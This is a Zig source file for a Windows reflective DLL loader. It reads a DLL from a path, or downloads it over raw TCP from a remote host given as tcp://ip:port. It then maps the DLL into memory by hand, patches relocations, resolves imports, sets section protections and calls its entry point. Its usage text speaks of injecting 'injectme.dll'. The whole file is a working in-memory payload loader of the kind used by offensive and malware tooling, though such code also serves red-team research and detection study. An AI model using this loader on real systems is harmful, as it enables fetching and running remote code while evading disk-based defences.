// set log level by build type
pub const default_level: std.Level = switch (std.builtin.mode) {
    .Debug => .debug,
    .ReleaseSafe, .ReleaseFast, .ReleaseSmall => .info,
};
const utility = @import("lib/utility.zig");

const std = @import("std");
const win32 = @import("win32").everything;
const windows = std.os.windows;

const DLLEntry = (*const fn (win32.HINSTANCE, u32, ?windows.LPVOID) callconv(.C) win32.BOOL);
const INVALID_FILESIZE: u32 = 0xFFFFFFFF;

const BASE_RELOCATION_ENTRY = packed struct(u16) {
    Offset: u12,
    Type: u4,
};

const IMAGE_ORDINAL_FLAG64: usize = 0x8000000000000000;
fn IMAGE_SNAP_BY_ORDINAL64(Ordinal: usize) bool {
    return (Ordinal & IMAGE_ORDINAL_FLAG64) != 0;
}

const FILE_TYPE = enum(u2) {
    SHARE,
    TCP,
};

const Action = struct {
    const Self = @This();

    const Error = error{
        UnknownError,
    };

    allocator: std.mem.Allocator,
    dll: [:0]u8,
    file_type: FILE_TYPE,
    ip: []u8,
    port: u16,

    pub fn init(allocator: std.mem.Allocator) !Self {
        return Self{
            .allocator = allocator,
            .dll = undefined,
            .file_type = undefined,
            .ip = undefined,
            .port = 0,
        };
    }

    // big thanks to https://0xrick.github.io/win-internals/pe1/

    pub fn reflect(self: *Self) !i32 {
        std.log.debug("[+] reflect called", .{});
        var dllBytes: ?*anyopaque = null;
        var dllSize: u32 = 0;

        // get this module's image base address
        // https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
        // const imagebase = win32.GetModuleHandleA(null);
        // if (imagebase == null) {
        //     std.log.err("[-] Failed to get imagebase :: {d}", .{@intFromEnum(win32.GetLastError())});
        //     return Error.UnknownError;
        // }
        // defer utility.closeHandle(imagebase);
        // std.log.debug("imagebase :: {any}", .{@intFromPtr(imagebase)});

        switch (self.file_type) {
            .SHARE => {
                std.log.debug("Reading file {s}", .{self.dll});
                // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea
                const dll = win32.CreateFileA(self.dll, win32.FILE_GENERIC_READ, win32.FILE_SHARE_NONE, null, win32.OPEN_EXISTING, win32.FILE_ATTRIBUTE_READONLY, null);
                if (dll == win32.INVALID_HANDLE_VALUE) {
                    std.log.err("[-] Failed CreateFileA({s}) :: {d}", .{ self.dll, @intFromEnum(win32.GetLastError()) });
                    return Error.UnknownError;
                }
                defer utility.closeHandle(dll);

                // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfilesize
                dllSize = win32.GetFileSize(dll, null);
                if (dllSize == INVALID_FILESIZE) {
                    std.log.err("[-] Failed CreateFileA({s}) :: {d}", .{ self.dll, @intFromEnum(win32.GetLastError()) });
                    return Error.UnknownError;
                }

                // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-getprocessheap
                const hHeap = win32.GetProcessHeap();
                if (hHeap == null) {
                    std.log.err("[-] Failed GetProcessHeap() :: {d}", .{@intFromEnum(win32.GetLastError())});
                    return Error.UnknownError;
                }

                // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc
                dllBytes = win32.HeapAlloc(hHeap, win32.HEAP_ZERO_MEMORY, dllSize);
                if (dllBytes == null) {
                    std.log.err("[-] Failed HeapAlloc(0x{x}) :: {d}", .{ dllSize, @intFromEnum(win32.GetLastError()) });
                    return Error.UnknownError;
                }
                // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapfree
                defer _ = win32.HeapFree(hHeap, win32.HEAP_ZERO_MEMORY, dllBytes);

                var outSize: u32 = 0;
                // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile
                const retval = win32.ReadFile(dll, dllBytes, dllSize, &outSize, null);

                if (outSize != dllSize or retval == 0) {
                    std.log.err("[-] Failed ReadFile({s}, {d}) :: {d}", .{ self.dll, dllSize, @intFromEnum(win32.GetLastError()) });
                    return Error.UnknownError;
                }
            },
            .TCP => {
                std.log.debug("Connecting to server {s}:{d}", .{ self.ip, self.port });
                const stream = try std.net.tcpConnectToHost(self.allocator, self.ip, self.port);
                var buffer: [8]u8 = std.mem.zeroes([8]u8);

                std.log.debug("Reading size ", .{});

                if (@sizeOf(u32) != try stream.readAtLeast(&buffer, @sizeOf(u32))) {
                    std.log.err("[-] Failed to read DLL size", .{});
                    return Error.UnknownError;
                }

                dllSize = std.mem.readInt(u32, buffer[0..@sizeOf(u32)], std.builtin.Endian.big);

                std.log.debug("Read size : {d}", .{dllSize});

                const dll = try self.allocator.alloc(u8, dllSize);

                if (dllSize != try stream.readAll(dll)) {
                    std.log.err("[-] Failed to read DLL", .{});
                    return Error.UnknownError;
                }

                dllBytes = dll.ptr;

                stream.close();
            },
        }

        // get pointers to in-memory DLL headers
        const dllBytesAddr = @intFromPtr(dllBytes);
        const base: usize = @intFromPtr(dllBytes.?);
        const DOSHeader = @as(*const win32.IMAGE_DOS_HEADER, @ptrFromInt(base)).*;
        const NTHeaderOffset: u32 = @intCast(DOSHeader.e_lfanew);
        const offset: usize = base + NTHeaderOffset;
        const NTHeader = @as(*const win32.IMAGE_NT_HEADERS64, @ptrFromInt(offset)).*;
        const DLLImageBase: usize = NTHeader.OptionalHeader.ImageBase;
        const DLLImageSize: usize = NTHeader.OptionalHeader.SizeOfImage;

        std.log.debug("base :: 0x{x}", .{base});
        std.log.debug("NTHeaderOffset :: 0x{x}", .{NTHeaderOffset});
        std.log.debug("NTHeader.ImageBase 0x{x}", .{DLLImageBase});
        std.log.debug("NTHeader.SizeOfImage 0x{x} // 0x{x}", .{ DLLImageSize, dllSize });
        std.log.debug("NTHeader.SizeOfOptionalHeader 0x{x}", .{NTHeader.FileHeader.SizeOfOptionalHeader});

        const rawBytes: []const u8 = @as([*]u8, @ptrCast(dllBytes))[0..dllSize];
        // std.log.debug("NTHeader DLLImageSize :: 0x{x} // 0x", .{rawBytes[0x78..0x7C]});

        // allocate new memory space for the DLL. Try to allocate memory in the image's preferred base address, but don't stress if the memory is allocated elsewhere
        // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
        var dllBase = win32.VirtualAlloc(
            @ptrFromInt(DLLImageBase),
            DLLImageSize,
            win32.VIRTUAL_ALLOCATION_TYPE{ .RESERVE = 1, .COMMIT = 1 },
            win32.PAGE_READWRITE,
        );
        if (dllBase == null) {
            dllBase = win32.VirtualAlloc(
                null,
                DLLImageSize,
                win32.VIRTUAL_ALLOCATION_TYPE{ .RESERVE = 1, .COMMIT = 1 },
                win32.PAGE_READWRITE,
            );

            if (dllBase == null) {
                std.log.err("[-] Failed VirtualAlloc({d}) :: {d}", .{ DLLImageSize, @intFromEnum(win32.GetLastError()) });
                return Error.UnknownError;
            }
        }

        const dllBaseAddr: usize = @intFromPtr(dllBase);
        // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfreeex
        defer _ = win32.VirtualFreeEx(
            win32.GetCurrentProcess(),
            dllBase,
            0,
            win32.MEM_RELEASE,
        );

        const dllBaseBytes: []u8 = @as([*]u8, @ptrCast(dllBase))[0..DLLImageSize];

        // get delta between this module's image base and the DLL that was read into memory
        const deltaImageBase: usize = @intFromPtr(dllBase) - DLLImageBase;
        std.log.debug("dllBase :: 0x{x}", .{@intFromPtr(dllBase.?)});
        std.log.debug("deltaImageBase :: 0x{x}", .{deltaImageBase});

        // copy over DLL image headers to the newly allocated space for the DLL
        @memcpy(dllBaseBytes[0..NTHeader.OptionalHeader.SizeOfHeaders], rawBytes[0..NTHeader.OptionalHeader.SizeOfHeaders]);

        // copy over DLL image sections to the newly allocated space for the DLL
        const sections: [*]win32.IMAGE_SECTION_HEADER = @ptrFromInt(dllBaseAddr +
            NTHeaderOffset +
            @offsetOf(win32.IMAGE_NT_HEADERS64, "OptionalHeader") +
            NTHeader.FileHeader.SizeOfOptionalHeader);
        std.log.debug("section start :: 0x{x}", .{@intFromPtr(&sections)});

        var idx: u32 = 0;
        while (idx < NTHeader.FileHeader.NumberOfSections) : (idx += 1) {
            std.log.debug("Loading {s} at 0x{x} // {any}", .{ sections[idx].Name, sections[idx].VirtualAddress, sections[idx].PointerToRawData });
            const sectionBytes: []u8 = @as([*]u8, @ptrFromInt(dllBytesAddr + sections[idx].PointerToRawData))[0..sections[idx].SizeOfRawData];
            @memcpy(dllBaseBytes[sections[idx].VirtualAddress .. sections[idx].VirtualAddress + sections[idx].SizeOfRawData], sectionBytes[0..sections[idx].SizeOfRawData]);
        }

        // perform image base relocations
        const relocations: win32.IMAGE_DATA_DIRECTORY = NTHeader.OptionalHeader.DataDirectory[@intFromEnum(win32.IMAGE_DIRECTORY_ENTRY_BASERELOC)];
        const relocationTable: usize = dllBaseAddr + relocations.VirtualAddress;
        std.log.debug("relocationTable: {x} ", .{relocationTable});

        var relocationsProcessed: usize = 0;
        var relocationBlock: *align(1) win32.IMAGE_BASE_RELOCATION = @ptrFromInt(relocationTable + relocationsProcessed);
        while (relocationBlock.VirtualAddress != 0) {
            std.log.debug("[!] Process Relations :: {x} of {x}", .{ relocationBlock.VirtualAddress, relocationBlock.SizeOfBlock });
            relocationsProcessed += relocationBlock.SizeOfBlock;
            const relocationsCount = (relocationBlock.SizeOfBlock - @sizeOf(win32.IMAGE_BASE_RELOCATION)) / @sizeOf(BASE_RELOCATION_ENTRY);
            const relocationEntries: [*]BASE_RELOCATION_ENTRY = @ptrFromInt(relocationTable + relocationsProcessed);

            std.log.debug("relocations: {x}", .{relocationsCount});
            idx = 0;
            while (idx < relocationsCount) : (idx += 1) {
                // std.log.debug("relocationEntries[{d}].Type :: {d}", .{ idx, relocationEntries[idx].Type });

                if (relocationEntries[idx].Type == win32.IMAGE_REL_BASED_ABSOLUTE) {
                    std.log.debug("[!] Skipping relocation", .{});
                    continue;
                }

                if (relocationEntries[idx].Type != win32.IMAGE_REL_BASED_HIGHLOW and relocationEntries[idx].Type != win32.IMAGE_REL_BASED_DIR64) {
                    std.log.debug("[!] Skipping relocation", .{});
                    continue;
                }

                const addressToPatch: *align(1) usize = @ptrFromInt(dllBaseAddr + relocationBlock.VirtualAddress + relocationEntries[idx].Offset);
                addressToPatch.* += deltaImageBase;
            }
            relocationBlock = @ptrFromInt(relocationTable + relocationsProcessed);
        }

        std.log.debug("[+] Resolve AIT", .{});

        // resolve import address table
        const imports: win32.IMAGE_DATA_DIRECTORY = NTHeader.OptionalHeader.DataDirectory[@intFromEnum(win32.IMAGE_DIRECTORY_ENTRY_IMPORT)];
        var importDescriptor: *win32.IMAGE_IMPORT_DESCRIPTOR = @ptrFromInt(dllBaseAddr + imports.VirtualAddress);
        idx = 1;

        while (importDescriptor.Name != 0) : (idx += 1) {
            const libraryName: ?[*:0]const u8 = @ptrFromInt(dllBaseAddr + importDescriptor.Name);
            // https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
            const library = win32.LoadLibraryA(libraryName);

            if (library == null) {
                std.log.err("[-] Failed LoadLibraryA({s}) :: {d}", .{ libraryName.?, @intFromEnum(win32.GetLastError()) });
            } else {
                var thunk: *win32.IMAGE_THUNK_DATA64 = @ptrFromInt(dllBaseAddr + importDescriptor.FirstThunk);
                var i: usize = 1;

                while (thunk.u1.AddressOfData != 0) : (i += 1) {
                    std.log.debug("Thunk[{d}] == {x}", .{ i, thunk.u1.AddressOfData });
                    if (IMAGE_SNAP_BY_ORDINAL64(thunk.u1.Ordinal)) {
                        std.log.debug("thunk.u1.Ordinal & 0xffff:: {x}", .{thunk.u1.Ordinal & 0xffff});
                        const functionOrdinal: ?[*:0]const u8 = @ptrFromInt(thunk.u1.Ordinal & 0xffff);
                        std.log.debug("GPA.snap: {s}", .{functionOrdinal.?});
                        thunk.u1.Function = @intFromPtr(win32.GetProcAddress(library, functionOrdinal));
                    } else {
                        const functionName: *win32.IMAGE_IMPORT_BY_NAME = @ptrFromInt(dllBaseAddr + thunk.u1.AddressOfData);
                        const functionOrdinal: ?[*:0]const u8 = @ptrCast(&functionName.Name);
                        std.log.debug("GPA: {x} // {s}", .{ functionName.Hint, functionOrdinal.? });
                        thunk.u1.Function = @intFromPtr(win32.GetProcAddress(library, functionOrdinal));
                    }
                    thunk = @ptrFromInt(dllBaseAddr + importDescriptor.FirstThunk + @sizeOf(win32.IMAGE_THUNK_DATA64) * i);
                }
            }

            importDescriptor = @ptrFromInt(dllBaseAddr + imports.VirtualAddress + @sizeOf(win32.IMAGE_IMPORT_DESCRIPTOR) * idx);
        }

        // TODO: Process delayed imports

        // Set memory protections on sections
        idx = 0;
        while (idx < NTHeader.FileHeader.NumberOfSections) : (idx += 1) {
            std.log.debug("Finalizing {s} at 0x{x} // {any}", .{ sections[idx].Name, sections[idx].VirtualAddress, sections[idx].PointerToRawData });
            var newSectionProtection: win32.PAGE_PROTECTION_FLAGS = win32.PAGE_PROTECTION_FLAGS{};

            const executable = sections[idx].Characteristics.MEM_EXECUTE == 1;
            const readable = sections[idx].Characteristics.MEM_READ == 1;
            const writeable = sections[idx].Characteristics.MEM_WRITE == 1;

            if (!executable and !readable and !writeable) {
                newSectionProtection.PAGE_NOACCESS = 1;
            } else if (!executable and !readable and writeable) {
                newSectionProtection.PAGE_WRITECOPY = 1;
            } else if (!executable and readable and !writeable) {
                newSectionProtection.PAGE_READONLY = 1;
            } else if (!executable and readable and writeable) {
                newSectionProtection.PAGE_READWRITE = 1;
            } else if (executable and !readable and writeable) {
                newSectionProtection.PAGE_EXECUTE_WRITECOPY = 1;
            } else if (executable and readable and !writeable) {
                newSectionProtection.PAGE_EXECUTE_READ = 1;
            } else {
                newSectionProtection.PAGE_EXECUTE_READWRITE = 1;
            }

            if (sections[idx].Characteristics.MEM_NOT_CACHED == 1) {
                newSectionProtection.PAGE_NOCACHE = 1;
            }

            var oldSectionProtection: win32.PAGE_PROTECTION_FLAGS = win32.PAGE_PROTECTION_FLAGS{};

            // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
            if (0 == win32.VirtualProtect(
                @ptrFromInt(dllBaseAddr + sections[idx].VirtualAddress),
                sections[idx].SizeOfRawData,
                newSectionProtection,
                &oldSectionProtection,
            )) {
                std.log.err("[-] Failed VirtualProtect({s}) :: {d}", .{ sections[idx].Name, @intFromEnum(win32.GetLastError()) });
                return Error.UnknownError;
            }
        }

        // TODO: TLS callbacks
        // TODO: Register exception handlers on 64 bit

        _ = win32.FlushInstructionCache(null, null, 0);

        const DLLMain: DLLEntry = @ptrFromInt(dllBaseAddr + NTHeader.OptionalHeader.AddressOfEntryPoint);

        // execute the loaded DLL
        const ret = @as(DLLEntry, DLLMain)(
            @ptrFromInt(dllBaseAddr),
            win32.DLL_PROCESS_ATTACH,
            null,
        );

        std.log.debug("Ret: {d}", .{ret});

        return ret;
    }

    pub fn debug(self: *Self) void {
        std.log.info("\nAttempt to inject {s}\n", .{self.dll});
    }

    pub fn parseDLL(self: *Self, line: []u8) !void {
        self.file_type = FILE_TYPE.SHARE;

        if (std.mem.startsWith(u8, line, "tcp://")) {
            self.file_type = FILE_TYPE.TCP;

            var iter = std.mem.splitAny(u8, line[6..], ":");
            self.ip = try std.fmt.allocPrintSentinel(self.allocator, "{s}", .{iter.next().?}, 0);
            errdefer self.allocator.free(self.ip);
            self.port = std.fmt.parseInt(u16, iter.next().?, 10) catch 55555;

            self.dll = try std.fmt.allocPrintSentinel(self.allocator, "{s}", .{""}, 0);
            errdefer self.allocator.free(self.dll);
        } else {
            self.ip = try std.fmt.allocPrintSentinel(self.allocator, "{s}", .{""}, 0);
            errdefer self.allocator.free(self.ip);
            self.port = 0;

            self.dll = try std.fmt.allocPrintSentinel(self.allocator, "{s}", .{line}, 0);
            errdefer self.allocator.free(self.dll);
        }
    }

    pub fn deinit(self: *Self) void {
        defer self.allocator.free(self.dll);
        defer self.allocator.free(self.ip);
    }
};

pub fn usage(argv: []u8) !void {
    const stdout = std.io.getStdOut().writer();

    try stdout.print(
        \\
        \\Example:
        \\
        \\ Attempt to load a DLL
        \\ .\\{s} C:\\windows\\temp\\injectme.dll
        \\ .\\{s} tcp://1.2.3.4:5678/injectme.dll
        \\
        \\ Show this menu
        \\ .\\{s} -h
        \\
    , .{ argv, argv, argv });

    std.posix.exit(0);
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    const allocator = gpa.allocator();
    defer _ = gpa.deinit();

    // Parse args into string array (error union needs 'try')
    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len < 2) {
        try usage(args[0]);
    }

    var action = try Action.init(allocator);
    defer action.deinit();

    var i: u8 = 0;

    for (args) |arg| {
        if (i == 1) {
            try action.parseDLL(arg);
        }

        i += 1;
    }

    action.debug();

    const exitcode = try action.reflect();

    if (exitcode != 0) {
        std.log.info("[+] Success {d}", .{exitcode});
    } else {
        std.log.info("[+] Failure...", .{});
    }

    win32.ExitProcess(@intCast(exitcode));
}
